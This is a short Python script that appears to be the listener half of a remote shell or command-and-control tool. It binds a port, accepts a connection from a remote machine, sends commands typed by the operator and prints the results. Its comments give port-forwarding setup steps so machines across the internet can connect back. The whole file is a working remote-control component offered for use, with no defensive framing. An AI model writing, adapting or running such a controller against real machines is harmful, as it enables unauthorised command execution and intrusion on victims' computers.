import socket
import sys
import os
import random
import string

HOST = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' # Change 0.0.0.0 to the ip of your device and go into your Router settings to setup port forwarding
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Enter this port when asked which port is to be forwarded

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

uname = os.getenv("username")
while True:
    print(f'[*] listening as {HOST}:{PORT}')

    client = s.accept()
    print(f'[*] client connected {client[1]}')

    client[0].send('welcome'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break
        
        # To add your own command remove the # below and change alias with the command alias and command with the command name

        # if cmd.lower() in ['alias', 'command']:   
            # put you code here

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client Y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
